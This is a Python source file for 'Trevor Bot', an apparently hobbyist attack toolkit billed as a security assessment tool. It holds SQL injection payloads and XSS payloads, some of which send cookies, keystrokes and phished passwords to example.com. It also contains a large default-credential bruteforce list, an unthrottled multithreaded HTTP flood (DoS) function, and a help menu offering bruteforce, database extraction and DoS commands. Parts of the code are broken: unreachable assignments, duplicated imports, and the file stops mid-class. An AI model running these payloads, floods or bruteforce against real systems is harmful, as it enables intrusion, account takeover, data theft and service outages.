#!/usr/bin/env python3
"""
Trevor Bot - Ultimate Security Assessment Tool with Enhanced Features
Combines v2.5.1 and v2.6 with all capabilities
Author: HmzzProo678
Version: 2.6 - Ultimate Combined Edition
"""

import os
import sys
import time
import subprocess
import requests
import socket
import ssl
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import json
import sqlite3
from datetime import datetime
import re
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
from flask import Flask
import dns.resolver
import OpenSSL
import cryptography
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import ipaddress
import random
import nmap
import scapy.all as scapy
import shutil
from pathlib import Path
import socket
import platform
import threading
import matplotlib.pyplot as plt
import os
import sys
import time
import random
import threading
import socket
import platform
from queue import Queue
from urllib.parse import urlparse
import matplotlib.pyplot as plt
from datetime import datetime
import requests
import pandas as pd

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class Trevor:
    def __init__(self):
        self.name = "Trevor Bot"
        self.version = "2.6"
        self.typing_speed = 0.02
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerabilities = []
        self.scraped_data = []
        self.scraped_files_dir = None  # direktori untuk simpan hasil scraping
        self.bruteforce_config = {
            'max_threads': 20,
            'timeout': 10,
            'delay': 0.2,
            'max_attempts': 1000
        }
        self.banner = """
╔══════════════════════════════════════════════════════════════╗
║  ████████╗██████╗ ███████╗██╗   ██╗ ██████╗ ██████╔╝         ║
║  ╚══██╔══╝██╔══██╗██╔════╝██║   ██║██╔═══██╗██╔══██╗        ║
║     ██║   ██████╔╝█████╗  ██║   ██║██║   ██║██████╔╝        ║
║     ██║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║   ██║██╔══██╗        ║
║     ██║   ██║  ██║███████╗ ╚████╔╝ ╚██████╔╝██║  ██║        ║
║     ╚═╝   ╚═╝  ╚═╝╚══════╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝        ║
║                                                              ║
║        Ultimate Security Assessment Terminal v2.6          ║
║     Combined Web App Security, Network Scanning & Recon      ║
║                 Thanks to: HmzzProo678 (dev)                 ║
╚══════════════════════════════════════════════════════════════╝
        """
        
        self.common_creds = self.load_credentials()
        
        self.sql_payloads = [
            "'", "''", "`", "``", ",", "\"", "\\", "\\'", "\\\"", ";", " OR '1'='1",
            " OR 1=1", " OR 1=1--", " OR 1=1#", " OR 1=1/*", ") OR '1'='1",
            ") OR ('1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
            "admin'--", "admin'#", "admin'/*", "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=2 UNION SELECT NULL,username,password FROM users--",
            "1' AND 1=2 UNION SELECT NULL,user,pass FROM admin--"
        ]
    
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "\" onmouseover=alert('XSS') \"",
            "' onfocus=alert('XSS') '",
            " onload=alert('XSS') ",
            "autofocus onfocus=alert('XSS')",
            "src=javascript:alert('XSS')",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "\\';alert('XSS');//",
            "\\\";alert('XSS');//",
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "jav&#x09;ascript:alert('XSS')",
            "jav&#x0A;ascript:alert('XSS')",
            "#<script>alert('XSS')</script>",
            "#javascript:alert('XSS')",
            "#\" onmouseover=alert('XSS') \"",
            "<img src=x oneonerrorrror=alert('XSS')>",
            "<iframe srcdoc='<script>alert(\"XSS\")</script>'>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src=x onerror=\\u0061lert('XSS')>",
            "<svg><script>alert&#40;'XSS'&#41;</script>",
            "<details open ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<img src=x:expression(alert('XSS'))>",
            "<style>@keyframes x{from{left:0;}to{left:1000px;}}#x{animation-name:x;}</style><div id=x onclick=alert('XSS')>XSS</div>",
            "<script>document.location='http://example.com/steal?cookie='+document.cookie</script>",
            "<img src=x onerror=\"fetch('http://example.com/steal',{method:'POST',body:document.cookie})\">",
            "<script>document.onkeypress=function(e){fetch('http://example.com/keylog?key='+e.key)}</script>",
            "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><h1>Session Expired</h1><p>Please login again:</p><form action=\"http://example.com/steal\" method=\"POST\">Username: <input type=\"text\" name=\"user\"><br>Password: <input type=\"password\" name=\"pass\"><br><input type=\"submit\" value=\"Login\"></form></div>"
        ]

        self.cipher_suites = {
            'TLS_AES_256_GCM_SHA384': 'TLS 1.3',
            'TLS_CHACHA20_POLY1305_SHA256': 'TLS 1.3',
            'TLS_AES_128_GCM_SHA256': 'TLS 1.3',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_AES_256_CBC_SHA256': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_WITH_AES_256_GCM_SHA384': 'TLS 1.2',
            'TLS_RSA_WITH_AES_128_GCM_SHA256': 'TLS 1.2',
            'TLS_RSA_WITH_AES_256_CBC_SHA256': 'TLS 1.2',
            'TLS_RSA_WITH_AES_128_CBC_SHA256': 'TLS 1.2',
            'TLS_RSA_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_anon_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_anon_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_KRB5_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_KRB5_WITH_3DES_EDE_CBC_MD5': 'TLS 1.2',
            'TLS_KRB5_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_KRB5_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_KRB5_WITH_AES_128_CBC_MD5': 'TLS 1.2',
            'TLS_KRB5_WITH_AES_256_CBC_MD5': 'TLS 1.2',
            'TLS_KRB5_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_KRB5_WITH_DES_CBC_MD5': 'TLS 1.2',
            'TLS_PSK_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_PSK_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_PSK_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_PSK_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_PSK_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_PSK_WITH_AES_256_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_PSK_WITH_AES_128_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_RSA_WITH_RC4_128_MD5': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_ECDH_ECDSA_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_ECDH_RSA_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_ECDH_anon_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_KRB5_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_KRB5_WITH_RC4_128_MD5': 'TLS 1.2',
            'TLS_PSK_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_DHE_PSK_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_RSA_PSK_WITH_RC4_128_SHA': 'TLS 1.2',
            'TLS_DH_DSS_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_DH_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_DSS_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_ECDSA_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_ECDHE_ECDSA_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_ECDHE_RSA_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_ECDH_anon_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA': 'TLS 1.2',
            'TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5': 'TLS 1.2',
            'TLS_KRB5_EXPORT_WITH_RC4_40_SHA': 'TLS 1.2',
            'TLS_KRB5_EXPORT_WITH_RC4_40_MD5': 'TLS 1.2',
            'TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_RSA_EXPORT1024_WITH_RC4_56_SHA': 'TLS 1.2',
            'TLS_DHE_DSS_EXPORT1024_WITH_DES_CBC_SHA': 'TLS 1.2',
            'TLS_DHE_DSS_EXPORT1024_WITH_RC4_56_SHA': 'TLS 1.2',
            'TLS_DHE_DSS_WITH_RC4_128_SHA': 'TLS 1.2',
            'SSL_RSA_WITH_NULL_MD5': 'SSL',
            'SSL_RSA_WITH_NULL_SHA': 'SSL',
            'SSL_RSA_EXPORT_WITH_RC4_40_MD5': 'SSL',
            'SSL_RSA_EXPORT_WITH_RC2_CBC_40_MD5': 'SSL',
            'SSL_RSA_WITH_RC4_128_MD5': 'SSL',
            'SSL_RSA_WITH_RC4_128_SHA': 'SSL',
            'SSL_RSA_WITH_IDEA_CBC_SHA': 'SSL',
            'SSL_RSA_WITH_DES_CBC_SHA': 'SSL',
            'SSL_RSA_WITH_3DES_EDE_CBC_SHA': 'SSL',
            'SSL_DH_DSS_WITH_DES_CBC_SHA': 'SSL',
            'SSL_DH_RSA_WITH_DES_CBC_SHA': 'SSL',
            'SSL_DHE_DSS_WITH_DES_CBC_SHA': 'SSL',
            'SSL_DHE_RSA_WITH_DES_CBC_SHA': 'SSL',
            'SSL_DH_anon_WITH_RC4_128_MD5': 'SSL',
            'SSL_DH_anon_WITH_DES_CBC_SHA': 'SSL'
        }
        # konfigurasi scanning port
        self.port_scan_options = {
            'fast_scan': {
                'description': 'Fast scan of top 100 common ports',
                'ports': [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                          993, 995, 1723, 3306, 3389, 5900, 8080, 8443],
                'timeout': 1,
                'threads': 50
            },
            'full_scan': {
                'description': 'Full scan of all 65535 ports (slow)',
                'ports': list(range(1, 65536)),
                'timeout': 1,
                'threads': 100
            },
            'service_scan': {
                'description': 'Service detection scan',
                'ports': [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 
                          993, 995, 3306, 3389, 5900, 8080],
                'timeout': 2,
                'threads': 20
            },
            'udp_scan': {
                'description': 'UDP port scan (common ports)',
                'ports': [53, 67, 68, 69, 123, 137, 138, 161, 162, 500, 514, 520],
                'timeout': 3,
                'threads': 10,
                'protocol': 'udp'
            },
            'os_detection': {
                'description': 'OS detection scan',
                'ports': [],
                'timeout': 5,
                'threads': 1
            }
        }
        # service banners to check for vulnerabilities
        self.vulnerable_banners = {
            'ftp': {
                'vsftpd 2.3.4': 'vsftpd 2.3.4 backdoor vulnerability (CVE-2011-2523)',
                'ProFTPD': 'Check for ProFTPD vulnerabilities (multiple CVEs)',
                'FileZilla': 'Check for FileZilla vulnerabilities'
            },
            'ssh': {
                'OpenSSH 7.2': 'Check for OpenSSH vulnerabilities (CVE-2016-8858, etc.)',
                'Dropbear': 'Check for Dropbear vulnerabilities'
            },
            'http': {
                'Apache 2.4.49': 'Apache HTTP Server path traversal (CVE-2021-41773)',
                'nginx 1.20.0': 'Check for nginx vulnerabilities',
                'IIS 6.0': 'Microsoft IIS 6.0 (multiple vulnerabilities)',
                'IIS 7.5': 'Microsoft IIS 7.5 (multiple vulnerabilities)'
            },
            'smtp': {
                'Sendmail': 'Check for Sendmail vulnerabilities',
                'Postfix': 'Check for Postfix vulnerabilities',
                'Exim': 'Check for Exim vulnerabilities (CVE-2019-10149, etc.)'
            },
            'rdp': {
                'Microsoft Terminal Services': 'Check for BlueKeep (CVE-2019-0708)'
            }
        }
        
    def load_credentials(self):
        """Load credentials from multiple sources including wordlists"""
        # kumpulan password lemah
        common = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('administrator', 'administrator'), ('root', 'root'), ('root', 'toor'),
            ('user', 'user'), ('guest', 'guest'), ('demo', 'demo'),
            ('test', 'test'), ('admin', ''), ('', 'admin'),
            ('admin', 'admin123'), ('admin', 'password123'), ('sa', ''),
            ('admin', 'qwerty'), ('admin', 'letmein'), ('admin', 'welcome'),
            ('admin', 'admin@123'), ('admin', 'admin1234'), ('admin', '12345678'),
            ('admin', '123456789'), ('admin', '1234567890'), ('admin', '123123'),
            ('admin', '111111'), ('admin', 'password1'), ('admin', '12345'),
            ('admin', '1234'), ('admin', '123'), ('admin', '000000'),
            ('admin', 'abc123'), ('admin', '654321'), ('admin', '123abc'),
            ('admin', 'iloveyou'), ('admin', 'monkey'), ('admin', 'sunshine'),
            ('admin', 'princess'), ('admin', 'dragon'), ('admin', 'football'),
            ('admin', 'master'), ('admin', 'superman'), ('admin', '1qaz2wsx'),
            ('admin', 'qazwsx'), ('admin', 'password!'), ('admin', 'passw0rd'),
            ('admin', 'admin@1234'), ('admin', 'admin@12345'), ('admin', 'admin@123456'),
            ('admin', 'admin@1234567'), ('admin', 'admin@12345678'), ('admin', 'admin@123456789'),
            ('admin', 'admin@1234567890'), ('admin', 'admin@1234567890-='), ('admin', 'admin@1234567890-=!@#$%^&*()_+'),
            ('Hamzah', 'Hamzah123')
        ]
        
        # 100 password umum
        top_passwords = [
            '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567',
            'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master',
            '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman',
            '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan',
            'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew',
            'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger',
            'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper',
            '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie',
            '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love',
            'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas',
            'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana',
            'moon', 'moscow', 'password1', 'patrick', 'penguin', 'pepsi', 'philip', 'phoenix', 'picture','Hamzah123'
        ]
        
        # variasi username umum
        usernames = [
            'admin', 'administrator', 'root', 'user', 'guest', 'test', 'demo', 
            'webadmin', 'sysadmin', 'operator', 'supervisor', 'manager',
            'backup', 'ftp', 'mysql', 'oracle', 'postgres', 'sql', 'dbadmin',
            'webmaster', 'support', 'tech', 'helpdesk', 'info', 'service',
            'sales', 'marketing', 'hr', 'finance', 'security', 'audit',
            'nobody', 'anonymous', 'public', 'default', 'service', 'cisco',
            'jira', 'confluence', 'jenkins', 'git', 'svn', 'docker', 'kubernetes',
            'aws', 'azure', 'gcp', 'cloud', 'dev', 'deploy', 'ci', 'cd','Hamzah'
        ]
        
        # menghasilkan kombinasi
        credentials = common.copy()
        
        # tambah variasi username dengan password
        for user in usernames:
            for pwd in top_passwords[:50]:  # top 50 password pertama
                credentials.append((user, pwd))
        
        # Add common username patterns with numbers
        for i in range(1, 11):
            credentials.append((f'admin{i}', f'admin{i}'))
            credentials.append((f'admin{i}', 'password'))
            credentials.append((f'admin{i}', f'password{i}'))
            credentials.append((f'user{i}', f'user{i}'))
        
        # Add common email patterns
        domains = ['example.com', 'test.com', 'company.com', 'localhost', 'domain.com']
        for domain in domains:
            credentials.append((f'admin@{domain}', 'admin'))
            credentials.append((f'admin@{domain}', 'password'))
            credentials.append((f'administrator@{domain}', 'administrator'))
        
        return credentials
    
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2)",
            "curl/7.68.0", 
            "Wget/1.21"
        ]
        self.last_attack = None
    def get_public_ip(self):
        """Get public IP address of the device"""
        try:
            # Try multiple services in case one fails
            services = [
                'https://api.ipify.org',
                'https://ident.me',
                'https://checkip.amazonaws.com',
                'https://icanhazip.com'
            ]
            
            for service in services:
                try:
                    response = requests.get(service, timeout=5)
                    if response.status_code == 200:
                        ip = response.text.strip()
                        return ip
                except:
                    continue
            
            return "Unable to determine public IP"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def typewriter_effect(self, text, speed=None):
        if speed is None:
            speed = self.typing_speed
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(speed)
        print()
    
    def loading_animation(self, text, duration=2):
        chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
        for i in range(duration * 20):
            sys.stdout.write(f'\r{text} {chars[i % len(chars)]}')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write('\r' + ' ' * (len(text) + 2) + '\r')
        sys.stdout.flush()
    
    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(self.banner)
        self.typewriter_effect(f"🤖 Trevor Bot v{self.version} - Ultimate Security Assessment Tool!")
        self.typewriter_effect("⚡ Web App Security, Network Scanning & Recon capabilities activated...")
        print()

    def simple_ds(self, target_url, thread_count=100):
        """Simple DoS attack with multiple threads - Use on localhost/lab only"""
        self.typewriter_effect(f"💥 Starting DoS attack on {target_url} with {thread_count} threads...")

        def attack():
            while True:
                try:
                    requests.get(target_url)
                    print("⚔️ Request sent")
                except:
                    print("❌ Failed")

        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.typewriter_effect("🛑 DoS attack stopped.")   
    
    def show_help(self):
        help_text = f"""
🔥 TREVOR BOT v{self.version} - ULTIMATE SECURITY COMMANDS:
──────────────────────────────────────────────────────────────

WEB APPLICATION SECURITY:
────────────────────────
🕷️  /scan:<url>           - Comprehensive security scan
                          Example: /scan:https://example.com

🔓 /bruteforce:<url>      - Enhanced login bruteforce with multiple techniques
                          Example: /bruteforce:https://site.com/login
                          Options: /bruteforce:<url>:<mode> where mode is:
                            basic - Basic common credentials (default)
                            wordlist - Use wordlist attack
                            combo - Username/password combos
                            hybrid - Hybrid attack with rules

💉 /sqltest:<url>         - Advanced SQL injection testing with DB extraction
                          Example: /sqltest:https://site.com/page.php?id=1

⚡ /xsstest:<url>         - Enhanced Cross-site scripting vulnerability test
                          Example: /xsstest:https://site.com/search.php

🔒 /sslcheck:<host>       - Enhanced SSL/TLS security analysis
                          Example: /sslcheck:example.com

📜 /scrape:<url>         - Web scraping and data extraction
                          Example: /scrape:https://example.com

📥 /downldscrap          - Download scraped HTML, CSS, and JavaScript files
                          (Must run /scrape first)

💥 /dos:<url>           - HTTP Flood attack for testing purposes
                          Example: /dos:https://example.com

📝 /webinfo:<url>      - Get comprehensive website information
                         Example: /webinfo:example.com
NETWORK SECURITY:
────────────────
🌐 /portscan:<host>       - Advanced network port scanning with multiple techniques
                          Example: /portscan:192.168.1.1
                          Options: /portscan:<host>:<type> where type is:
                            fast - Fast scan (top ports)
                            full - Full port scan
                            service - Service detection
                            udp - UDP scan
                            os - OS detection

🔍 /hostdiscover:<range>  - Network host discovery
                          Example: /hostdiscover:192.168.1.0/24

REPORTING:
──────────
📊 /report                - View detailed vulnerability reports
📋 /scraped               - View scraped data
❓ /help                  - Show this help menu
🚪 /exit                  - Exit Trevor Bot

⚠️  WARNING: Only use on systems you own or have explicit permission to test!
        """
        self.typewriter_effect(help_text)
    
    def scrape_website(self, url):
        """Enhanced web scraping with HTML/CSS/JS extraction and file saving capability"""
        self.typewriter_effect(f"📜 Starting ENHANCED web scraping of: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Reset scraped data
            self.scraped_data = []
            
            # Create a directory for scraped files
            domain = urlparse(url).netloc
            self.scraped_files_dir = os.path.join(os.getcwd(), f"scraped_{domain}")
            
            # Remove old directory if exists
            if os.path.exists(self.scraped_files_dir):
                shutil.rmtree(self.scraped_files_dir)
            
            # Create new directory structure
            os.makedirs(self.scraped_files_dir)
            os.makedirs(os.path.join(self.scraped_files_dir, "css"))
            os.makedirs(os.path.join(self.scraped_files_dir, "js"))
            os.makedirs(os.path.join(self.scraped_files_dir, "images"))
            
            # Save main HTML file
            main_html_path = os.path.join(self.scraped_files_dir, "index.html")
            with open(main_html_path, 'w', encoding='utf-8') as f:
                f.write(response.text)
            
            self.typewriter_effect(f"\n💾 Saved main HTML to: {main_html_path}")
            
            # 1. Get full HTML structure
            self.typewriter_effect("\n🔍 Extracting HTML structure...")
            html_structure = self.extract_html_structure(soup)
            self.scraped_data.append({
                'type': 'HTML Structure',
                'data': html_structure
            })
            
            # 2. Extract all CSS (inline, embedded, external)
            self.typewriter_effect("\n🎨 Extracting CSS...")
            css_data = self.extract_css(soup, url)
            self.scraped_data.append({
                'type': 'CSS',
                'data': css_data
            })
            
            # Save CSS files
            for i, css in enumerate(css_data['external']):
                css_path = os.path.join(self.scraped_files_dir, "css", f"external_{i}.css")
                with open(css_path, 'w', encoding='utf-8') as f:
                    f.write(css['content'])
                self.typewriter_effect(f"💾 Saved CSS to: {css_path}")
            
            # 3. Extract all JavaScript
            self.typewriter_effect("\n⚡ Extracting JavaScript...")
            js_data = self.extract_javascript(soup, url)
            self.scraped_data.append({
                'type': 'JavaScript',
                'data': js_data
            })
            
            # Save JavaScript files
            for i, js in enumerate(js_data['external']):
                js_path = os.path.join(self.scraped_files_dir, "js", f"external_{i}.js")
                with open(js_path, 'w', encoding='utf-8') as f:
                    f.write(js['content'])
                self.typewriter_effect(f"💾 Saved JS to: {js_path}")
            
            # 4. Extract all links
            self.typewriter_effect("\n🔗 Extracting links...")
            links = [a.get('href') for a in soup.find_all('a', href=True)]
            self.scraped_data.append({
                'type': 'Links',
                'data': links[:50]  # Store first 50 links
            })
            
            # 5. Extract all images
            self.typewriter_effect("\n🖼️ Extracting images...")
            images = [img.get('src') for img in soup.find_all('img', src=True)]
            self.scraped_data.append({
                'type': 'Images',
                'data': images[:20]  # Store first 20 images
            })
            
            # Download images
            for i, img_url in enumerate(images[:10]):  # Download first 10 images
                try:
                    if not img_url.startswith(('http', 'https')):
                        img_url = urljoin(url, img_url)
                    
                    img_response = self.session.get(img_url, stream=True, timeout=5)
                    if img_response.status_code == 200:
                        img_path = os.path.join(self.scraped_files_dir, "images", f"image_{i}{Path(img_url).suffix}")
                        with open(img_path, 'wb') as f:
                            for chunk in img_response.iter_content(1024):
                                f.write(chunk)
                        self.typewriter_effect(f"💾 Saved image to: {img_path}")
                except Exception as e:
                    continue
            
            # 6. Extract all forms
            self.typewriter_effect("\n📝 Extracting forms...")
            forms = []
            for form in soup.find_all('form'):
                form_data = self.extract_form_details(form)
                forms.append(form_data)
            self.scraped_data.append({
                'type': 'Forms',
                'data': forms
            })
            
            # 7. Extract meta tags
            self.typewriter_effect("\n🏷️ Extracting meta tags...")
            metas = []
            for meta in soup.find_all('meta'):
                metas.append({
                    'name': meta.get('name'),
                    'content': meta.get('content'),
                    'property': meta.get('property')
                })
            self.scraped_data.append({
                'type': 'Meta Tags',
                'data': metas[:20]  # Store first 20 meta tags
            })
            
            # 8. Extract text content
            self.typewriter_effect("\n📄 Extracting text content...")
            text = ' '.join([p.get_text() for p in soup.find_all('p')])
            self.scraped_data.append({
                'type': 'Text Content',
                'data': text[:1000] + '...'  # Store first 1000 chars
            })
            
            # 9. Extract emails
            self.typewriter_effect("\n✉️ Extracting emails...")
            emails = re.findall(r'[\w\.-]+@[\w\.-]+', response.text)
            if emails:
                self.scraped_data.append({
                    'type': 'Emails',
                    'data': list(set(emails))  # Remove duplicates
                })
            
            # 10. Extract phone numbers
            self.typewriter_effect("\n📞 Extracting phone numbers...")
            phone_numbers = re.findall(r'(\+?\d[\d\s\-\(\)]{7,}\d)', response.text)
            if phone_numbers:
                self.scraped_data.append({
                    'type': 'Phone Numbers',
                    'data': list(set(phone_numbers))  # Remove duplicates
                })
            
            self.typewriter_effect("\n✅ Enhanced web scraping completed!")
            self.typewriter_effect(f"📁 All scraped files saved to: {self.scraped_files_dir}")
            
        except Exception as e:
            self.typewriter_effect(f"❌ Web scraping failed: {str(e)}")
    
    def download_scraped_files(self):
        """Download all scraped files as a zip archive"""
        if not self.scraped_files_dir or not os.path.exists(self.scraped_files_dir):
            self.typewriter_effect("❌ No scraped files available. Run /scrape first.")
            return
        
        try:
            # Create zip file name
            domain = os.path.basename(self.scraped_files_dir).replace("scraped_", "")
            zip_filename = f"scraped_{domain}_{int(time.time())}.zip"
            
            # Create zip archive
            shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', self.scraped_files_dir)
            
            self.typewriter_effect(f"\n📦 Successfully created zip archive: {zip_filename}")
            self.typewriter_effect(f"💾 Path: {os.path.join(os.getcwd(), zip_filename)}")
            
        except Exception as e:
            self.typewriter_effect(f"❌ Failed to create zip archive: {str(e)}")
    
    def extract_html_structure(self, soup):
        """Extract HTML structure with important elements"""
        html_data = {
            'doctype': '',
            'html_tag': {},
            'head_elements': [],
            'body_structure': []
        }
        
        # Get DOCTYPE
        if soup.original_encoding:
            html_data['doctype'] = f"<!DOCTYPE {soup.original_encoding}>"
        
        # Get HTML tag attributes
        if soup.html:
            html_data['html_tag'] = dict(soup.html.attrs)
        
        # Get HEAD elements
        if soup.head:
            for child in soup.head.children:
                if child.name:
                    element = {
                        'tag': child.name,
                        'attributes': dict(child.attrs)
                    }
                    if child.name == 'title' and child.string:
                        element['content'] = child.string.strip()
                    html_data['head_elements'].append(element)
        
        # Get BODY structure (first 3 levels)
        if soup.body:
            html_data['body_structure'] = self.extract_body_structure(soup.body)
        
        return html_data

